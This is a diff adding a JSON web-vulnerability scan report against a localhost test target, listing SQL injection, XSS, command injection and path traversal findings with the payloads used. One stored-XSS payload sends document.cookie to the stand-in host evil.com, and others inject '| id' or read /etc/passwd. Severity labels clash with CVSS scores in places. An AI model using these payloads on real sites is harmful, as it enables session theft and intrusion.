@@ -1,0 +1,515 @@
+{
+  "scan_id": "0d6e3963-134d-445b-aa8e-8810000347fd",
+  "title": "Vulnerability Report - http://127.0.0.1:18899",
+  "generated_at": "2026-08-17T05:51:43.470088",
+  "target_url": "http://127.0.0.1:18899",
+  "scan_status": "completed",
+  "scan_duration": 10.3,
+  "risk_level": "Critical",
+  "total_findings": 11,
+  "severity_counts": {
+    "critical": 1,
+    "high": 2,
+    "medium": 0,
+    "low": 8,
+    "info": 0
+  },
+  "families_detected": [
+    "path_traversal",
+    "cmdi",
+    "xss",
+    "sqli"
+  ],
+  "key_findings": [
+    {
+      "title": "SQLI (error-based) in id at http://127.0.0.1:18899/user?id=1",
+      "severity": "critical",
+      "affected_url": "http://127.0.0.1:18899/user?id=1",
+      "affected_parameter": "id"
+    },
+    {
+      "title": "XSS (reflected) in q at http://127.0.0.1:18899/search",
+      "severity": "high",
+      "affected_url": "http://127.0.0.1:18899/search",
+      "affected_parameter": "q"
+    },
+    {
+      "title": "XSS (stored) in id at http://127.0.0.1:18899/user?id=1",
+      "severity": "high",
+      "affected_url": "http://127.0.0.1:18899/user?id=1",
+      "affected_parameter": "id"
+    },
+    {
+      "title": "XSS (reflected) in username at http://127.0.0.1:18899/login",
+      "severity": "low",
+      "affected_url": "http://127.0.0.1:18899/login",
+      "affected_parameter": "username"
+    },
+    {
+      "title": "SQLI (error-based) in username at http://127.0.0.1:18899/login",
+      "severity": "low",
+      "affected_url": "http://127.0.0.1:18899/login",
+      "affected_parameter": "username"
+    }
+  ],
+  "findings": [
+    {
+      "id": "",
+      "title": "SQLI (error-based) in id at http://127.0.0.1:18899/user?id=1",
+      "severity": "critical",
+      "cvss_score": 9.8,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "confidence": "high",
+      "verified": false,
+      "injection_family": "sqli",
+      "injection_subtype": "error-based",
+      "cwe_id": "CWE-89",
+      "affected_url": "http://127.0.0.1:18899/user?id=1",
+      "affected_parameter": "id",
+      "payload": "' OR 1=1--",
+      "description": "Potential sqli vulnerability. Anomaly indicators: status_code_change, body_length_significant_change, response_time_spike, sql_error_disclosure. Payload: ' OR 1=1--",
+      "evidence": {
+        "reasons": [
+          "status_code_change",
+          "body_length_significant_change",
+          "response_time_spike",
+          "sql_error_disclosure"
+        ],
+        "status_code": 500,
+        "body_length": 131,
+        "response_time": 0.548073
+      },
+      "remediation": "Consult OWASP guidelines for general injection prevention."
+    },
+    {
+      "id": "",
+      "title": "XSS (reflected) in q at http://127.0.0.1:18899/search",
+      "severity": "high",
+      "cvss_score": 8.1,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N",
+      "confidence": "high",
+      "verified": false,
+      "injection_family": "xss",
+      "injection_subtype": "reflected",
+      "cwe_id": "CWE-79",
+      "affected_url": "http://127.0.0.1:18899/search",
+      "affected_parameter": "q",
+      "payload": "<script>alert(1)</script>",
+      "description": "Potential xss vulnerability. Anomaly indicators: body_length_significant_change, xss_reflection. Payload: <script>alert(1)</script>",
+      "evidence": {
+        "reasons": [
+          "body_length_significant_change",
+          "xss_reflection"
+        ],
+        "status_code": 200,
+        "body_length": 128,
+        "response_time": 0.028448
+      },
+      "remediation": "Consult OWASP guidelines for general injection prevention."
+    },
+    {
+      "id": "",
+      "title": "XSS (stored) in id at http://127.0.0.1:18899/user?id=1",
+      "severity": "high",
+      "cvss_score": 9.8,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "confidence": "high",
+      "verified": false,
+      "injection_family": "xss",
+      "injection_subtype": "stored",
+      "cwe_id": "CWE-79",
+      "affected_url": "http://127.0.0.1:18899/user?id=1",
+      "affected_parameter": "id",
+      "payload": "<script>document.location='http://evil.com/?c='+document.cookie</script>",
+      "description": "Potential xss vulnerability. Anomaly indicators: status_code_change, body_length_significant_change, xss_reflection. Payload: <script>document.location='http://evil.com/?c='+document.cookie</script>",
+      "evidence": {
+        "reasons": [
+          "status_code_change",
+          "body_length_significant_change",
+          "xss_reflection"
+        ],
+        "status_code": 500,
+        "body_length": 193,
+        "response_time": 0.53134
+      },
+      "remediation": "Consult OWASP guidelines for general injection prevention."
+    },
+    {
+      "id": "",
+      "title": "XSS (reflected) in username at http://127.0.0.1:18899/login",
+      "severity": "low",
+      "cvss_score": 8.6,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H",
+      "confidence": "low",
+      "verified": false,
+      "injection_family": "xss",
+      "injection_subtype": "reflected",
+      "cwe_id": "CWE-79",
+      "affected_url": "http://127.0.0.1:18899/login",
+      "affected_parameter": "username",
+      "payload": "<script>alert(1)</script>",
+      "description": "Potential xss vulnerability. Anomaly indicators: body_length_significant_change. Payload: <script>alert(1)</script>",
+      "evidence": {
+        "reasons": [
+          "body_length_significant_change"
+        ],
+        "status_code": 404,
+        "body_length": 38,
+        "response_time": 0.023481
+      },
+      "remediation": "Consult OWASP guidelines for general injection prevention."
+    },
+    {
+      "id": "",
+      "title": "SQLI (error-based) in username at http://127.0.0.1:18899/login",
+      "severity": "low",
+      "cvss_score": 8.6,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H",
+      "confidence": "low",
+      "verified": false,
+      "injection_family": "sqli",
+      "injection_subtype": "error-based",
+      "cwe_id": "CWE-89",
+      "affected_url": "http://127.0.0.1:18899/login",
+      "affected_parameter": "username",
+      "payload": "' OR 1=1--",
+      "description": "Potential sqli vulnerability. Anomaly indicators: body_length_significant_change, response_time_spike. Payload: ' OR 1=1--",
+      "evidence": {
+        "reasons": [
+          "body_length_significant_change",
+          "response_time_spike"
+        ],
+        "status_code": 404,
+        "body_length": 38,
+        "response_time": 0.528353
+      },
+      "remediation": "Consult OWASP guidelines for general injection prevention."
+    },
+    {
+      "id": "",
+      "title": "SQLI (time-based) in password at http://127.0.0.1:18899/login",
+      "severity": "low",
+      "cvss_score": 8.6,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H",
+      "confidence": "low",
+      "verified": false,
+      "injection_family": "sqli",
+      "injection_subtype": "time-based",
+      "cwe_id": "CWE-89",
+      "affected_url": "http://127.0.0.1:18899/login",
+      "affected_parameter": "password",
+      "payload": "'; WAITFOR DELAY '0:0:5'--",
+      "description": "Potential sqli vulnerability. Anomaly indicators: body_length_significant_change, response_time_spike. Payload: '; WAITFOR DELAY '0:0:5'--",
+      "evidence": {
+        "reasons": [
+          "body_length_significant_change",
+          "response_time_spike"
+        ],
+        "status_code": 404,
+        "body_length": 38,
+        "response_time": 0.527749
+      },
+      "remediation": "Consult OWASP guidelines for general injection prevention."
+    },
+    {
+      "id": "",
+      "title": "CMDI (blind) in q at http://127.0.0.1:18899/search",
+      "severity": "low",
+      "cvss_score": 8.1,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N",
+      "confidence": "low",
+      "verified": false,
+      "injection_family": "cmdi",
+      "injection_subtype": "blind",
+      "cwe_id": "CWE-78",
+      "affected_url": "http://127.0.0.1:18899/search",
+      "affected_parameter": "q",
+      "payload": "| timeout 5",
+      "description": "Potential cmdi vulnerability. Anomaly indicators: body_length_significant_change, response_time_spike. Payload: | timeout 5",
+      "evidence": {
+        "reasons": [
+          "body_length_significant_change",
+          "response_time_spike"
+        ],
+        "status_code": 200,
+        "body_length": 100,
+        "response_time": 0.529485
+      },
+      "remediation": "Consult OWASP guidelines for general injection prevention."
+    },
+    {
+      "id": "",
+      "title": "CMDI (os_command) in username at http://127.0.0.1:18899/login",
+      "severity": "low",
+      "cvss_score": 8.6,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H",
+      "confidence": "low",
+      "verified": false,
+      "injection_family": "cmdi",
+      "injection_subtype": "os_command",
+      "cwe_id": "CWE-78",
+      "affected_url": "http://127.0.0.1:18899/login",
+      "affected_parameter": "username",
+      "payload": "| id",
+      "description": "Potential cmdi vulnerability. Anomaly indicators: body_length_significant_change, response_time_spike. Payload: | id",
+      "evidence": {
+        "reasons": [
+          "body_length_significant_change",
+          "response_time_spike"
+        ],
+        "status_code": 404,
+        "body_length": 38,
+        "response_time": 0.536373
+      },
+      "remediation": "Consult OWASP guidelines for general injection prevention."
+    },
+    {
+      "id": "",
+      "title": "PATH_TRAVERSAL (basic) in id at http://127.0.0.1:18899/user?id=1",
+      "severity": "low",
+      "cvss_score": 5.3,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+      "confidence": "low",
+      "verified": false,
+      "injection_family": "path_traversal",
+      "injection_subtype": "basic",
+      "cwe_id": "CWE-22",
+      "affected_url": "http://127.0.0.1:18899/user?id=1",
+      "affected_parameter": "id",
+      "payload": "../../../etc/passwd",
+      "description": "Potential path_traversal vulnerability. Anomaly indicators: body_length_significant_change. Payload: ../../../etc/passwd",
+      "evidence": {
+        "reasons": [
+          "body_length_significant_change"
+        ],
+        "status_code": 200,
+        "body_length": 59,
+        "response_time": 0.527096
+      },
+      "remediation": "Consult OWASP guidelines for general injection prevention."
+    },
+    {
+      "id": "",
+      "title": "SQLI (error-based) in q at http://127.0.0.1:18899/search",
+      "severity": "low",
+      "cvss_score": 8.1,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N",
+      "confidence": "low",
+      "verified": false,
+      "injection_family": "sqli",
+      "injection_subtype": "error-based",
+      "cwe_id": "CWE-89",
+      "affected_url": "http://127.0.0.1:18899/search",
+      "affected_parameter": "q",
+      "payload": "' OR 1=1--",
+      "description": "Potential sqli vulnerability. Anomaly indicators: body_length_significant_change, response_time_spike. Payload: ' OR 1=1--",
+      "evidence": {
+        "reasons": [
+          "body_length_significant_change",
+          "response_time_spike"
+        ],
+        "status_code": 200,
+        "body_length": 98,
+        "response_time": 0.517314
+      },
+      "remediation": "Consult OWASP guidelines for general injection prevention."
+    },
+    {
+      "id": "",
+      "title": "CMDI (os_command) in password at http://127.0.0.1:18899/login",
+      "severity": "low",
+      "cvss_score": 8.6,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H",
+      "confidence": "low",
+      "verified": false,
+      "injection_family": "cmdi",
+      "injection_subtype": "os_command",
+      "cwe_id": "CWE-78",
+      "affected_url": "http://127.0.0.1:18899/login",
+      "affected_parameter": "password",
+      "payload": "; id",
+      "description": "Potential cmdi vulnerability. Anomaly indicators: body_length_significant_change, response_time_spike. Payload: ; id",
+      "evidence": {
+        "reasons": [
+          "body_length_significant_change",
+          "response_time_spike"
+        ],
+        "status_code": 404,
+        "body_length": 38,
+        "response_time": 0.0254
+      },
+      "remediation": "Consult OWASP guidelines for general injection prevention."
+    }
+  ],
+  "mitigation_items": [
+    {
+      "finding_title": "SQLI (error-based) in id at http://127.0.0.1:18899/user?id=1",
+      "injection_subtype": "error-based",
+      "injection_family": "sqli",
+      "title": "Unknown Injection Type",
+      "description": "No mitigation data available for this sub-type.",
+      "remediation": "Consult OWASP guidelines for general injection prevention.",
+      "code_examples": {},
+      "waf_rules": {},
+      "references": [
+        "https://owasp.org/www-community/attacks/"
+      ]
+    },
+    {
+      "finding_title": "XSS (reflected) in q at http://127.0.0.1:18899/search",
+      "injection_subtype": "reflected",
+      "injection_family": "xss",
+      "title": "Unknown Injection Type",
+      "description": "No mitigation data available for this sub-type.",
+      "remediation": "Consult OWASP guidelines for general injection prevention.",
+      "code_examples": {},
+      "waf_rules": {},
+      "references": [
+        "https://owasp.org/www-community/attacks/"
+      ]
+    },
+    {
+      "finding_title": "XSS (stored) in id at http://127.0.0.1:18899/user?id=1",
+      "injection_subtype": "stored",
+      "injection_family": "xss",
+      "title": "Unknown Injection Type",
+      "description": "No mitigation data available for this sub-type.",
+      "remediation": "Consult OWASP guidelines for general injection prevention.",
+      "code_examples": {},
+      "waf_rules": {},
+      "references": [
+        "https://owasp.org/www-community/attacks/"
+      ]
+    },
+    {
+      "finding_title": "SQLI (time-based) in password at http://127.0.0.1:18899/login",
+      "injection_subtype": "time-based",
+      "injection_family": "sqli",
+      "title": "Unknown Injection Type",
+      "description": "No mitigation data available for this sub-type.",
+      "remediation": "Consult OWASP guidelines for general injection prevention.",
+      "code_examples": {},
+      "waf_rules": {},
+      "references": [
+        "https://owasp.org/www-community/attacks/"
+      ]
+    },
+    {
+      "finding_title": "CMDI (blind) in q at http://127.0.0.1:18899/search",
+      "injection_subtype": "blind",
+      "injection_family": "cmdi",
+      "title": "Unknown Injection Type",
+      "description": "No mitigation data available for this sub-type.",
+      "remediation": "Consult OWASP guidelines for general injection prevention.",
+      "code_examples": {},
+      "waf_rules": {},
+      "references": [
+        "https://owasp.org/www-community/attacks/"
+      ]
+    },
+    {
+      "finding_title": "CMDI (os_command) in username at http://127.0.0.1:18899/login",
+      "injection_subtype": "os_command",
+      "injection_family": "cmdi",
+      "title": "Unknown Injection Type",
+      "description": "No mitigation data available for this sub-type.",
+      "remediation": "Consult OWASP guidelines for general injection prevention.",
+      "code_examples": {},
+      "waf_rules": {},
+      "references": [
+        "https://owasp.org/www-community/attacks/"
+      ]
+    },
+    {
+      "finding_title": "PATH_TRAVERSAL (basic) in id at http://127.0.0.1:18899/user?id=1",
+      "injection_subtype": "basic",
+      "injection_family": "path_traversal",
+      "title": "Unknown Injection Type",
+      "description": "No mitigation data available for this sub-type.",
+      "remediation": "Consult OWASP guidelines for general injection prevention.",
+      "code_examples": {},
+      "waf_rules": {},
+      "references": [
+        "https://owasp.org/www-community/attacks/"
+      ]
+    }
+  ],
+  "compliance": {
+    "total_families": 4,
+    "owasp_categories": [],
+    "pci_requirements": [],
+    "unique_cwes": [],
+    "mappings": [
+      {
+        "family": "path_traversal",
+        "owasp_category": "N/A",
+        "owasp_title": "Unknown Family",
+        "owasp_risk": "Unknown",
+        "pci_requirement": "N/A",
+        "pci_title": "Unknown Family",
+        "pci_severity": "Unknown",
+        "cwe_ids": [],
+        "cwe_names": []
+      },
+      {
+        "family": "cmdi",
+        "owasp_category": "N/A",
+        "owasp_title": "Unknown Family",
+        "owasp_risk": "Unknown",
+        "pci_requirement": "N/A",
+        "pci_title": "Unknown Family",
+        "pci_severity": "Unknown",
+        "cwe_ids": [],
+        "cwe_names": []
+      },
+      {
+        "family": "xss",
+        "owasp_category": "N/A",
+        "owasp_title": "Unknown Family",
+        "owasp_risk": "Unknown",
+        "pci_requirement": "N/A",
+        "pci_title": "Unknown Family",
+        "pci_severity": "Unknown",
+        "cwe_ids": [],
+        "cwe_names": []
+      },
+      {
+        "family": "sqli",
+        "owasp_category": "N/A",
+        "owasp_title": "Unknown Family",
+        "owasp_risk": "Unknown",
+        "pci_requirement": "N/A",
+        "pci_title": "Unknown Family",
+        "pci_severity": "Unknown",
+        "cwe_ids": [],
+        "cwe_names": []
+      }
+    ]
+  },
+  "config": {
+    "max_depth": 2,
+    "concurrency": 10,
+    "rate_limit": 30,
+    "tools": [
+      "crawler",
+      "nuclei",
+      "ffuf",
+      "sqlmap"
+    ],
+    "follow_redirects": true,
+    "verify_ssl": false,
+    "custom_headers": {},
+    "excluded_paths": [],
+    "scope_regex": ""
+  },
+  "appendix": {
+    "severity_definitions": {
+      "Critical": "Exploitation is straightforward and results in complete system compromise.",
+      "High": "Exploitation requires specific conditions but leads to significant impact.",
+      "Medium": "Exploitation is possible but requires chaining with other vulnerabilities.",
+      "Low": "Limited impact, typically requires authenticated access or specific configurations.",
+      "Info": "Informational finding with no direct security impact."
+    },
+    "cvss_scoring": "CVSS v3.1 scores range from 0.0 to 10.0."
+  }
+}
